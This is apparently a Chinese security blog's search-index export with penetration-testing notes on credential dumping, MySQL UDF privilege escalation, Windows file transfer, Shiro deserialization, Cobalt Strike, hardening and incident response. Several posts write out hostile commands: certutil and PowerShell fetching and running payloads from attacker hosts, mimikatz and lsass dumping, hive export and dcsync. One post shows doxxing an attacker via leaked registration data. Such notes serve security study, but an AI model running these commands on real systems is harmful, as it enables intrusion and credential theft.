{"pages":[],"posts":[{"title":"记录一次真实溯源经历","text":"背景在一次针对XX类型单位的攻防演练中，本人作为蓝队值守应领导要求对某个攻击IP进行溯源。 溯源过程 IP查询 站长之家查询是上海腾讯云的IP 由于是腾讯云我采用忘记账号的方式查询电话辅助信息，可以获得脱敏的手机号 域名解析记录查询 通过360安全大脑可以查询出该IP曾解析过一个个人域名xxx.top xxx.top还未过期，可以猜测该IP临时改绑了 ICP备案信息泄露 通过微步对该IP归属单位进行查询，发现他并没有对自己的信息隐私化，可以查到归属人姓名 网络查询（博客、学校） 通过百度搜索该域名可以查询到网页中包含该域名网站，于是查询到了归属人的博客园，通过博客园可以获得归属人的网名xxx 根据网名和归属人姓名可以查询到学校和相关奖项 总结上述溯源过程纯属运气，由于攻击队某个成员没有将自己的IP曾经绑定的个人站中的备案信息隐私化，从而得以让我们查找到真实姓名，进行溯源反查。","link":"/2023/09/02/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E6%BA%AF%E6%BA%90%E7%BB%8F%E5%8E%86/"},{"title":"Linux安全加固","text":"安全加固方向 用户安全 文件安全 登录安全 系统环境CentOS7.9 重要文件/etc/login.defs文件功能 定义了 /etc/passsword以及/etc/shadow配置的用户限制，这个文件在系统中一定要存在，某些时候不会影响系统的使用，但有些时候会导致意想不到的错误。 如果**/etc/passsword以及/etc/shadow与/etc/login.defs文件产生了冲突，系统会以/etc/passsword以及/etc/shadow**为准，它们的优先级较高。 1234567891011121314151617MAIL_DIR /var/spool/mailPASS_MAX_DAYS 99999 #密码最大有效期，以天为单位，一般为90天PASS_MIN_DAYS 0 #两次修改密码的最小间隔，以天为单位PASS_MIN_LEN 5 #密码最小长度，对root无效PASS_WARN_AGE 7 #密码过期前n天提示UID_MIN 1000 #用户ID，当你创建普通用户时如果不指定UID，则会从1000递增UID_MAX 60000 #当你创建普通用户的最大IDSYS_UID_MIN 201 #不指定UID，创建的系统用户的最小UIDSYS_UID_MAX 999 #不指定UID，创建的系统用户的最大UIDGID_MIN 1000GID_MAX 60000SYS_GID_MIN 201SYS_GID_MAX 999CREATE_HOME yes #创建用户的时候为这个用户创建家目录UMASK 077 #用户家目录的权限值 700USERGROUPS_ENAB yes #删除用户时，当用户组内没有其他的用户时，是否删除用户组，CentOS7在创建用户的时候，用户的GID是100ENCRYPT_METHOD SHA512 #用户的密码使用SHA512加密 通用文件 1234567891011121314151617MAIL_DIR /var/spool/mailPASS_MAX_DAYS 90PASS_MIN_DAYS 0PASS_MIN_LEN 12PASS_WARN_AGE 7UID_MIN 1000UID_MAX 60000SYS_UID_MIN 201SYS_UID_MAX 999GID_MIN 1000GID_MAX 60000SYS_GID_MIN 201SYS_GID_MAX 999CREATE_HOME yesUMASK 077USERGROUPS_ENAB yesENCRYPT_METHOD SHA512 /etc/passwd用户名：用户密码：用户uid：用户的gid：用户的注释：用户的主目录：用户的shell 12root: x: 0: 0: root: /root: /bin/bashbin: x: 1: 1: bin: /bin: /sbin/nologin /etc/shadow由于/etc/passwd允许所有用户读取，容易导致用户的密码泄露，所以linux系统将用户的相关密码信息从/etc/shadow分离出来，并且这个文件只有root才可以访问。 12root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologin /etc/ssh/sshd_configssh服务器的配置文件 12345port 22 #登录端口ListenAddress 0.0.0.0 #监听地址，只能使用这个地址进行ssh登录，0.0.0.0允许所有的连接，一般改为跳板机地址LoginGraceTime 2m #连接主机时，输入密码的时间超过2m就断开permitRootLogin no #是否允许root远程登录maxAuthTries 6 #最多尝试次数 /etc/bashrc环境变量，初始化整个系统bash的设置 -rw-r--r-- 1 root root 37 May 30 11:37 README.md -代表普通文件 d代表目录 l代表软链接 r读权限4 w写权限2 x执行权限1 文件所有者的权限 -文件所有者同用户组的权限 -其他用户对该文件的权限 目录 文件 777 666 022(建议027) 022(建议027) 755 644 history -a 打开命令行记录 123456export HISTFILE=&quot;/opt/cmd_history/${LOGIN_USER}/history&quot; #每个用户历史命令存储位置shopt -s histhappendPROMPT_COMMAND=“history -a” #查看历史命令的命令HISTFILESIZE=50000 HISTTIMEFORMAT=&quot;%F %T&quot; #列出执行命令的命令和时间export HSTTIMEFORMAT /etc/profile环境变量，用来设置整个系统的环境变量 /etc/hosts.deny主机的黑名单 12sshd:ALL #禁止所有人使用ssh登录本机sshd:[ip地址] #禁止某个ip登录本机 /etc/hosts.allow主机的白名单 1sshd:[ip地址] #允许指定的机器(管理机地址或者VPN地址)登录本机 Nginx加固网站根目录文件不能属于 root 而是 nginx 权限改为生产建议027，权限最小化 端口扫描扫描开放端口，防止只能在内网开放的端口开放到外网 1nmap [ip地址] 半开式扫描更加隐蔽 1namp -sS [IP地址] 安全加固 禁止目录浏览 隐藏版本信息 1234567891011121314151617181920212223vim /etc/nginx/nginx.conf #配置信息http{ ... server{ listen 80 default_server; listen [::]:80 default_server; server_name _; root /usr/share/nginx/html; server_tokens off; #添加这一项，隐藏版本号 autoindex off; #禁止目录浏览 location / { } error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } } 限制http请求方法 123if ($request_method !~ ^(GET|HEAD|POST)$ ) { return444; } 限制ip访问 123456location / { deny 192.168.1.1; #拒绝IP allow 192.168.1.0/24; #允许IP allow 10.1.1.0/16; #允许IP deny all; #拒绝其他所有IP } 限定SSL版本 123server { ssl_protocols TLSv1.2;} 限制超时 1234client_body_timeout 10; #设置客户端请求主体读取超时时间 client_header_timeout 10; #设置客户端请求头读取超时时间 keepalive_timeout 55; #第一个参数指定客户端连接保持活动的超时时间，第二个参数是可选的，它指定了消息头保持活动的有效时间 send_timeout10; #指定响应客户端的超时时间 限制权限 1user nobody; 限制并发和速度 123456789101112limit_zone one $binary_remote_addr 10m; server { listen 80; server_name www.test.com; index index.html index.htm index.php; root /usr/local/www; #Zone limit; location / { limit_conn one 1; limit_rate 20k; } ……… } 配置防盗链 1234567location ~* ^.+\\.(gif|jpg|png|swf|flv|rar|zip)$ { valid_referers none blocked server_names *.test.com http://localhost baidu.com; if ($invalid_referer) { rewrite ^/ [img]http://www.XXX.com/images/default/logo.gif[/img]; # return403; } }","link":"/2023/06/03/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"},{"title":"Windows文件传输","text":"FTP攻击机： python快速开启ftp服务器 12pip3 install pyftpdlibpython3 -m pyftpdlib 目标机： 用控制台写入一个ftp.txt文件，使用匿名登录anonymous到攻击机的ftp服务，从攻击机上下载恶意文件msftest.apk 123456copy con ftp.txt open 192.168.1.227 2121 anonymousanonymousget msftest.apkquit 保存为ftp.txt文件： 1ftp -i -s:ftp.txt Certutil下载并执行 1certutil.exe -urlcache -split -f http://192.168.1.227:8000/shell.exe shell.exe&amp;shell.exe 清除下载缓存 1certutil.exe -urlcache -split -f http://192.168.1.227:8000/shell.exe delete 缓存目录： 1%USERPROFILE%\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache\\\\Content Powershell创建下载对象 12$p = new-object system.net.webclient$p.downloadfile(&quot;http://x.xx.xx.x/file&quot;,&quot;c:vxx/x/file&quot;) 完整命令示例 12345powershell -c &quot;$p=new-object system.net.webclient;$p.DownloadFile('http://192.168.1.227/s.txt','s.txt\\')&quot;powershell (new-object system.net.webclient).downloadfile('http://192.168.1.227/s.txt','s.txt\\')powershell Invoke-WebRequest -uri &quot; http://192.168.1.227/s.txt &quot; -OutFile &quot;$env:temp\\s.php&quot; SCP文件上传 file.txt为要上传的文件名 username为您的用户名 remote_host为远程主机名或IP地址 /remote_directory/为要将文件上传到的远程目录路径 1scp file.txt username@remote_host:/remote_directory/ 文件下载 username为您的用户名 remote_host为远程主机名或IP地址 /remote_directory/file.txt为下载的远程文件路径 1scp username@remote_host:/remote_directory/file.txt . 总结这里列举了几种Windows下常见的文件上传和下载方式，主要用来在获取shell后进行进一步的上传木马文件或者下载敏感文件。","link":"/2023/06/02/Windows%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"},{"title":"UDF提取","text":"参考文章： https://blog.csdn.net/qq_43430261/article/details/107258466 UDF路径默认在MySQL根目录下的/lib/plugin 也可以通过select @@basedir查看根目录 原理通过引入udf.dll来创建自定义函数，下面语句的含义是定义了sys_eval的函数，这个函数在udf.dll中有实现，通过引入这个函数来执行系统命令 1CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; 提权利用由于sys_eval函数是以管理员权限运行的，所以我们现在考虑如何将这个管理员权限转移给我们的shell 将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\\plugin文件夹下） 从udf文件中引入自定义函数(user defined function) 执行自定义函数 我们现在需要udf.dll，可以通过sqlmap进行获取，进入到sqlmap\\extra\\cloak\\cloak目录执行下述命令，就会在指定的路径下生成动态链接库 1cloak.py -d -i D:\\sqlmap\\udf\\mysql\\windows\\32\\lib_mysqludf_sys.dll_ 接下来我们需要，授予特定可供命令执行的文件以管理员权限，于是我们可以将MySQL中的管理员权限转移出来 1234567891011mysql -u root -p 'R@v3nSecurity' # 进入mysqluse mysql; # 切换数据库create table foo (line blob); # 新建一个表，用来存放本地传来的udf文件的内容insert into foo values(load_file('[udf路径]')); # 在foo中写入udf文件内容select * from foo into dumpfile '[你要写入udf的路径]'; # 将udf文件内容传入新建的udf文件中,这里的dumpfile要和用linEnum.sh查看的mysql的路径一致# windows中，对于mysql小于5.1的，导出目录为C:\\Windows\\或C:\\Windows\\System32\\，linux中，5.1以上lib\\plugincreate function sys_eval returns integer soname '[你的udf名]'; # 导入udf函数select sys_eval('chmod u+s /usr/bin/find');create table foo(line blob); # 给 find 命令加上 setuid 的标志，然后调用find的-exec指令来执行命令quit; # 退出mysql 总结这里补充了UDF提权方式，通过MySQL引入udf.dll并创建自定义命令执行函数，授予某个常用的命令以管理员权限，从而导致将MySQL中的权限转移出来造成提权","link":"/2023/06/14/UDF%E6%8F%90%E6%9D%83/"},{"title":"Windows密码凭证获取","text":"Hash简介参考链接：几种windows本地hash值获取和破解详解 Windows系统使用两种方法对用户的密码逬行哈希处理，它们分别是LAN Manager (LM)哈希和NT LANManager (NTLM)哈希. 所谓哈希(hash),就是使用一种加密函数进行计算后的结果.这个加密函数对一个任意长度的字符串数据进行一次数学加密函数运算，然后返回一个固定长度的字符串. 现在已经有了更新的NTLMv2以及Kerberos验证体系. Windows加密过的密码口令，我们称之为hash, Windows的系统密码hash默认情况下TS由两部分组成：第一部分是LM-hash，第二部分是NTLM-hashₒ Hash分类 2000 xp 2003 Vista win7 2008 2012 LM ✔ ✔ ✔ NTLM ✔ ✔ ✔ ✔ ✔ ✔ ✔ LM哈希密码最大长度为14，密码长度超过14位是要用NTLM哈希。 Hash格式用户名RID：LM-HASH值 ：NT-HASH值 用户的SID值末尾的4个数字为用户的RID值 Windows认证基础本地认证：用户直接操作计算机登录 网络认证：远程连接到工作组的某个设备 域认证：登录到域环境的某个设备 Windows本地认证 用户输入密码 系统收到密码后将用户 输入的密码计算成NTLM Hash 与sam数据库（%SystemRoot%\\system32\\config\\sam） 匹配则登录成功 本地认证中用来处理用户输入密码的进程为Isass.exe，密码会在这个进程中明文保存，供该进程将NTLM Hash和sam数据库中的Hash及进行比对，我们使用mimikatz来获取的明文密码，就是在这个进程中读取到的。 系统用户密码凭证获取minikatz本地非交互式凭证获取 123minikatz.exe &quot;log res.txt&quot; &quot;privilege::debuug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;minikatz.exe &quot;log logon.txt&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; 这里展示获取Hash值方法 首先进入privilege::debug进行提权 接着进行token模拟，运行token::elevate可以将权限提到system 然后使用lsdump::sam把sam数据库中的值dump下来，可以获取用户hash值 最后登录md5解密网站进行解密 如果解密不出来，据说可以利用这个hash值进行域内的横向移动。 powershellpowershell远程加载mimikatz脚本 1powershell IEX (New-Object Net.webClient).Downloading('你的vps中脚本下载地址');Invoke-Mimikatz-DumpCreds Pwddump7这款工具也可以读取当前系统的各个用户的密码hash 在命令行输入 1Pwddump7.exe &gt; pass.txt Ophcrack配合彩虹表进行口令破解 工具下载： https://ophcrack.sourceforge.io/ 彩虹表： https://ophcrack.sourceforge.io/tables.php http://project-rainbowcrack.com/table.htm Procdump+Mimikatz（比较常用）这个是微软的工具，经过微软认证，所以杀软比较不会识别 工具下载： https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump Procdump lsass 进程导出： 12x86：procdump.exe -accepteula -ma lsass.exe lsass.dmpx64：procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 然后用mimikatz还原密码 12sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full minikatz免杀方法参考链接：https://www.freebuf.com/articles/system/234365.html 注册表导出Hash123reg save HKLM\\SYSTEM system.hivreg save HKLM\\SAM sam.hivreg save HKLM\\SECURITY security.hiv 导出后可以使用cain导入system.hiv、security.hiv获取缓存中的明文信息 1mimikatz.exe &quot;lsadump::sam /system:system.hiv /sam:sam.hiv&quot; eixt meterpreter获取Hashmeterpreter集成了minikatz模块 使用命令 123load minikatz msv 获取明文密码kerberos 获取明文密码 以及其他命令，不作详述。 cobaltstrike获取Hashcobaltstrike也能够在监听器中使用mimikatz 其他Powershell脚本获取RDP记录参考：https://github.com/3gstudent/List-RDP-Connections-History.git 可以获取RDP连接记录 本地RDP连接密码解密查看连接记录 1reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot; /s 查看是否有密码文件 1dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* 查看保存在本地的远程主机信息 1cmdkey /list mimikatz解密 123456789提权privilege::debug可以得到guidMasterkey，记录这个值dpapi::cred/in:[指定需要解密的文件的路径] 得到MasterKeysekurlsa::dpapi解密得到口令dpapi::cred /masterkey:[刚才获取的masterkey值] PPTP口令获取PPTP点对点隧道协议，可以使远程用户拨入ISP访问企业内网。 在渗透测试中，获取了PPTP口令，就可以登录内网进行进一步渗透。 需要得到管理员权限。 Mysql数据库密码破解与用户相关的三个文件是user.frm、user.MYD\\USER.myi,Mysql数据库用户名密码都保存在user.MYD中。 加密方式： Mysql4.1之前是Mysql323加密 Mysql4.1之后是MysqlSHA1加密 总结这里列举了一些比较常见的密码凭证获取的方法，可以发现密码凭证大多数都是使用Hash值进行存储，破解其实也比较困难，主要是采用彩虹表，但也不排除有些密码凭证是以明文方式存储的。总而言之，方法总比困难多。","link":"/2023/06/01/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/"},{"title":"shiro组件相关漏洞","text":"shiro漏洞原理介绍参考链接 https://www.freebuf.com/articles/web/364631.html https://xz.aliyun.com/t/8997 shiro-550Apache Shiro框架提供了记住密码的功能，用户登录成功后会生成经过加密并编码的cookie，在服务端对rememberMe的Cookie值，先base64解码再AES解密再反序列化，就导致了反序列化RCE漏洞。 调用逻辑示例代码来源于vulhub镜像源码 加密部分 首先运行代码，在Bean中查看shiroConfig中的调用逻辑，我们知道shiro的漏洞就存在于RememberMe功能中，我们跟进cookieRememberMeManager方法。 可以看到这个方法返回的是一个CookieRemberMeManager对象，我们跟进CookieRememberMeManager类。 可以看到CookieRememberMeManager方法在Http请求体中设置了字段名为rememberMe的Cookie，CookieRememberMeManager方法所在的CookieRememberMe类继承了AbstractRememberMeManager类，我们跟进AbstractRememberMeManager类。 可以看到一个私有的默认base64编码加密密钥kPH+bIxk5D2deZiIxcaaaA==，那么这个密钥用来做什么呢，根据另一个私有成员cipherService猜测是AES加密密钥，接着向下看发现这个加密密钥被默认设置了，也就意味着每一次加密使用的都是同一个密钥，这会导致严重的安全问题。我们向下看明文和密文的来源和去向。 可以看到encrypt方法中对一个序列化字节数组进行了加密，但这里我们无法找到这个序列化字节数组的详情，于是在这里下了一个方法断点，通过调试来回溯。 返回上一帧，发现调用位置是在convertPrincipalsToBytes方法，我们看到principals其实是我们的用户名”admin”, 这里将用户名转换成了字节数组然后进行了加密，再继续返回上一帧看看。 可以看到rememberIdentity对前端获取的token进行了处理，以principal对象形式传递给后续的加密步骤。 解密部分 类似加密部分的第5步，我们在AbstractRememberMeManager类声明中可以找到decrypt方法，它对加密数据进行了解密，返回 了一个序列化字节数组，这个字节数组内容大概率是一个principal对象（根据前面的调试猜测），在此设置方法断点进行调试。 单步步过直到convertBytesToPrincipals方法，发现了反序列化的位置就在convertBytesToPrincipals方法中，将解密的字节数组进行反序列化。 单步步入deserialize方法中，发现这里创建了一个字节数组输入流对象用来存储序列化的字节数组，再通过readObject方法进行反序列化，这也是反序列化漏洞触发的接口位置。 修复手段 更新shiro组件版本 不使用默认的加密密钥，一次一密最稳妥 shiro-721Apache Shiro cookie中通过AES-128-CB模式加密的rememberMe字段存在问题，用户通过Padding Oracle加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。 shiro-721 的调用逻辑和shiro-550的方式非常类似，差别最大的就是AbstractRememberMeManager类中，AES密钥不再使用硬编码模式了，而是通过KeyGenerator进行了密钥生成，这也意味着我们难以获取密钥，无法直接破解这个AES加密系统，但是攻击者提出了另一种思路，即Padding Oracle Attack（填充提示攻击），可以实现无需加密密钥直接构造密文。 Padding Oracle Attack参考链接： https://ctf-wiki.org/crypto/blockcipher/mode/padding-oracle-attack/ 利用该漏洞可以破解出密文的明文以及将明文加密成密文，该漏洞存在条件如下： 攻击者能够获取到密文（基于分组密码模式），以及IV向量（通常附带在密文前面，初始化向量） 攻击者能够修改密文触发解密过程，解密成功和解密失败存在差异性 加密算法：AES 工作模式：CBC 填充方式： PKCS5Padding 密钥长度： 128bit PKCS5Padding将数据填充到8的倍数，填充数据计算公式是，假如原数据长度为len，利用该方法填充后的长度是 len + (8 - (len % 8)), 填充的数据长度为 8 - (len % 8)，块大小固定为8字节，如果刚好长度满足8字节，则新增一个全为0x08的块。所有填充的值为需要填充的字节数，这种填充方式只有在填充字符为0x01-0x08之间才是合法的。 攻击思路 根据CBC加密模式，解密时初始IV将与经过key解密的密文块异或得到明文块（后面我们称经过key解密的密文块为中间块），如果我们能够不获取key而直接获得中间块，那么我们就可以破解出明文。 由于PKCS5Padding的特性，每个填充块有这么几种可能： XXXXXXX 0x01 XXXXXX 0x02 0x02 XXXXX 0x03 0x03 0x03 XXXX 0x04 0x04 0x04 0x04 XXX 0x05 0x05 0x05 0x05 0x05 XX 0x06 0x06 0x06 0x06 0x06 0x06 X 0x07 0x07 0x07 0x07 0x07 0x07 0x07 0x08 0x08 0x08 0x08 0x08 0x08 0x08 0x08 当我们提交一个IV时，服务器会用中间值与它异或得值然后先校验填充情况而非直接比对明文。 此时服务器会返回两种情况：正确的密文返回200或者302；错误的密文返回500。 假定明文最后一位填充为0x01，那么我们可以暴力枚举IV最后一个字节，若服务器响应200，则对应的中间块字节为该IV一个字节异或0x01。 假定明文最后两位填充为0x02，那么我们的IV最后一个字节固定为上次计算出的中间块字节异或0x02，暴力枚举IV倒数第二个字节，若服务器响应200，则对应的中间块字节为该IV倒数第二个字节异或0x02。 按照上述的攻击方式可以逐步推导出整个中间块，从而计算出第一个明文块，用同样的方式可以直接计算出所有明文。 修复手段 更新shiro组件版本 由于Padding Oracle Attack需要通过服务器响应进行判断，我们可以对服务器流量进行限制，将短时间多次访问的IP进行限制 shiro识别与漏洞发现环境安装使用docker一键部署 shiro漏洞发现记住密码功能 返回包set cookie位置显示字段rememberMe=XXX 如果返回包没有，在请求包的cookie中加上rememberMe字段，如果返回包里返回了，则使用了shiro shiro漏洞检测使用shiroscan工具进行检测 在DNSLog上查看回显，可是太卡了没办法看到。 获取shell使用python脚本进行将获取的shell反弹到vps上 查看vps的情况，发现反弹了shell 总结不管是shiro-550还是shiro-721，导致反序列化接口暴露的原因都是不安全的加密方式，一个是直接使用了硬编码模式，将默认密钥写入了源码中，一个能够根据工作模式和填充方式组合的缺陷绕过获取密钥直接暴力破解出明文。","link":"/2023/06/07/shiro%E7%BB%84%E4%BB%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/"},{"title":"cobaltstrike","text":"简单介绍Cobalt strike 继承了端口转发、扫描多模式端口Listener，Windows exe程序生成、Windows dll动态链接库生成、java程序生成，office宏代码生成，站点克隆等 环境要求java8环境 CentOS7.9中的下载命令(不需要配置环境变量) 1yum -y install java-1.8.0-openjdk-devel.x86_64 配置使用将Cobaltstrike文件夹上传到vps中，打包成zip使用Xshell传输。 vps将zip文件解包 1unzip cobaltstrike4.zip 将teamserver文件授予可执行权限 1chmod +x teamserver 开启teamserver服务端 1./teamserver [公网IP] [自定义密码] 运行截图 客户端输入对应的信息即可连接 常用功能 靶机控制设置sleep即心跳，原本的sleep为60，是为了防止被防火墙拦截，如果我们进行测试可以将其改为更小的值。 执行shell命令，beacon中执行shell命令的格式： 1shell [命令] 执行提权，在windows中提权可以升级为system权限，在linux中提权可以升级成root权限。 运行mimikatz是为了获取系统命令。 攻击流程 1.我们需要先设置监听器，设置我们vps的信息。 2.然后进行攻击-生成后门-生成windows可执行程序 3.然后进行钓鱼攻击-文件下载-生成恶意下载链接 4.靶机点击链接，下载并执行可执行文件，在cobaltstrike可以看到靶机上线，然后可以进行后渗透。 总结Cobaltstrike的功能非常多，可以自行探索，建议Cobaltstrike可以做稳定控制，metasploit进行信息搜集和漏洞利用。","link":"/2023/05/31/cobaltstrike/"},{"title":"域内密码凭证获取","text":"Volume Shadow Copy活动目录数据库ntds.dit：活动目录数据库，包括有关域用户、组和组成员身份的信息。它还包括域中所有用户的密码哈希值。 为了保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。因此想要破解sam文件与ntds.dit文件都需要拥有一个system文件。 AD DS数据存储： 由ntds.dit文件构成 默认存储在所有域控制器上的%SystemRoot%\\NTDS文件夹中 只能通过域控制器进程和协议访问 由于Windows阻止对这些文件的标准读取或复制操作，因此必须使用特殊技术来获取副本。 Volume Shadow CopyVolume Shadow Copy Service是微软从Windows XP开始提供的用于创建一致性的时间点副本的服务框架。 用于数据备份 支持WindowsServer2003及以上操作系统 系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份无法确定 禁用VSS会影响系统正常使用，如System Restore和Windows Server Backup NtdsutilNtdsutil.exe：一个为AD提供管理设施的命令行工具，域环境默认安装 交互式操作 123456789ntdsutil 进入交互界面snapshot 创建快照activate instance ntds 创建实例create 创建快照返回了一串快照集guidmount [guid] 装载到C盘unmount [guid] 卸载快照del [guid] 删除快照quit 效果上看是创建了一个 C盘的快照，但是却发现原本无法复制的存放Hash的文件可以复制和打开了 非交互式操作 查询当前系统的快照 12ntdsutil snapshot &quot;List All&quot; quit quitntdsutil snapshot &quot;List Mounted&quot; quit quit 创建快照 1ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit 挂载快照 1ntdsutil snapshot &quot;mounted [guid]&quot; quit quit 卸载快照 1ntdsutil snapshot &quot;unmounted [guid]&quot; quit quit 删除快照 1ntdsutil snapshot &quot;del [guid]&quot; quit quit 交互式 123456ntdsutil 进入交互界面activate instance ntds 创建实例ifm 使用ifmcreate full &lt;Drive&gt;:\\&lt;Folder&gt; 指定驱动器和文件夹quitquit 非交互式 1ntdsutil &quot;activate instance ntds&quot; create full &lt;Drive&gt;:\\&lt;Folder&gt; quit quit vssadminVssAdmin：是Windows系统提供的卷景影复制服务VsS)的管理工具，域环境默认安装 用于创建或删除卷影副本，列出卷影副本的信息 用于显示所有安装的所有卷影副本写入程序和提供程序 改变卷影副本存储空间的大小等 查询当前系统的快照 1vssadmin list shadows 创建快照 1vssadmin create shadow /for=C 获得Shadow Copy Volume Name 1\\\\?GLOBALROOT\\Device\\HarddiskVolumeShadowCopy10 复制快照 1copy \\\\?GLOBALROOT\\Device\\HarddiskVolumeShadowCopy10 [保存路径] 删除快照 1vssadmin delete shadows /for=C /queit 痕迹 无法直接访问，需要创建符号链接进行访问 解密ntds.ditQuarkPwDumpQuarksPwDump是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。 1.修复复制出来的数据库文件 1esentutl /p /o ntds.dit 2.使用QuarksPwDump直接读取信息并将结果导出至文件 1QuarksPwDump.exe --dump-hash-domain --output [输出文件名] --ntds-file ntds.dit NtdsAuditNtdsAudit可以十分高效的破解ntds文件并将全部域用户信息导出方便查找域用户状态. 将ntds.dit文件和SYSTEM文件放在同一自录下执行命令 1NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;system.hive&quot;-p pwdump.txt --users-csv users.csv mimikatz(通常直接用cobaltstrike)通过dcsync直接获取mingy域内所有用户hash 1mimikatz lsadump:dcsync /domain:[域名] /all/csv 总结许多没法进行复制或打开的文件，可以通过创建快照的方式来创建副本，于是可以进行复制和打开，sam文件、ntds.dit文件、system文件的获取就是如此，利用了卷影的机制。","link":"/2023/06/04/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/"},{"title":"护网应急响应（绿盟）","text":"快速识别安全事件入侵事件 主机、服务器被入侵 Web站点被入侵 信息泄露事件 敏感信息泄露 用户弱口令 源代码泄露 Web应用安全事件 SQL注入 XSS XXE 短信炸弹 如何发现安全事件主动发现日志分析 安全设备日志 主机日志 中间件日志 应用程序日志 恶意文件监控 木马 Webshell 其他可疑文件 安全威胁情报 被动发现系统运维报告异常 网络丢包 系统频繁重启 系统蓝屏 系统资源占用率过高 业务用户投诉或抱怨 用户收到异常短信 用户异常退出登录 被通报 如何判断影响范围异常主机所处环境 内网接入区 外来接入区 单台主机or多台主机 已被感染or处于危险中 异常主机用途 个人办公主机 特殊权限主机 工控主机 应用服务器 数据库服务器 域控服务器 快速分析与侦查三要素法 回溯攻击法护网中常见的安全风险主机监听端口整理 异常被监听端口 异常会话连接 代码/命令执行 Weblogic Struts2 JBoss ThinkPHP MS17-010 Fastjson 弱口令 Web应用弱口令 中间件弱口令 数据库 ssh、ftp、ssh、rdp 钓鱼邮件 恶意word 恶意PPT 恶意链接 信息搜集 常见web漏洞 SQL注入 XSS XXE 越权操作 任意文件读取 文件上传风险 头像 附件 图标 经验法中间件根目录文件上传目录 /var/tmp 默认下载路径 C:\\Users\\Account\\Downloads apache-tomcat-*/conf/tomcat-users.xml servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/ servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/ servers/AdminServer/tmp/_WL internal/wls-wsat/ 社会工程学常见手法恶意邮件 CVE-2018-0802 CVE-2017-8570 CVE-20017-11882 钓鱼网站 信息搜集 远程代码执行 CVE-2018-15982 CVE-2018-4878 微信 假扮系统维护人员索要系统账号 常见服务端口 21：FTP（未授权访问、弱口令） 22 ： SSH(弱口令) 23：Telnet（未授权访问、弱口令） 445：SMB（远程命令执行） 1433：MSSQL（弱口令、提权） 3306：MySQL（弱口令、提权） 3389：RDP（弱口令、远程代码执行） 7001 ：weblogic（弱口令、SSRF、反序列化） 8080：Tomcat（启用PUT方法、弱口令） 27017：MongoDB（未授权访问） 快速取证和隔离常用工具和脚本Tcpview AutoRuns WebShell查杀工具 D盾 findwebshell 日志工具 windows sublime/UE LogParser/LogParser Lizard Event log Explorer web应用 WebLog Expert linux Goaccess grep、cat、more、less、awk 分析思路应用被入侵 Web/FTP日志-IP地址 数据库日志/应用日志 -访问操作、时间 系统日志-系统操作、用户 怎么判断日志中的异常请求 时间 频率 来源 恶意代码 取证对象和流程 保护第一现场 按照上述开展应急响应 不轻信一面之词 取证对象病毒木马文件 日志文件 主机日志 应用日志 安全设备日志 攻击者残留文件 在主机上抓取的流量包 快速隔离方法已经发生安全事件的对象 断网、下线 边界控制设备，防止网络区域相互影响 处在危险中的对象 采取及时补救加固措施 相关漏洞的扫描修补与追踪 进行黑盒/白盒安全测试","link":"/2023/06/04/%E6%8A%A4%E7%BD%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"title":"文件上传巩固","text":"[TOC] 本地部署使用c0ny1的github仓库文件在windows下一键部署 关卡详解Pass-01tips：本pass在客户端使用js对不合法图片进行检查！ 思路：前端的检查不能阻止我们修改请求包的内容，于是我将请求包的图片后缀名修改为php使得shell可以解析，再尝试用蚁剑连接。 将此处文件名修改为.php后缀 测试对应上传路径可以成功连接蚁剑 分析源码发现它只允许.jpg|.png|.gif为后缀的文件上传 123456789101112131415161718function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; }} Pass-02tips：本pass在服务端对数据包的MIME进行检查！ 思路：这说明服务端会检查数据包的Content-Type字段，我们得保证上传的文件的MIME类型为服务端允许类型。 我们只要保证Content-Type字段为图片类型即可 分析源码发现它只允许MIME类型为image/jpeg|image/png|image/gif的文件上传。 1234567891011121314151617181920$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 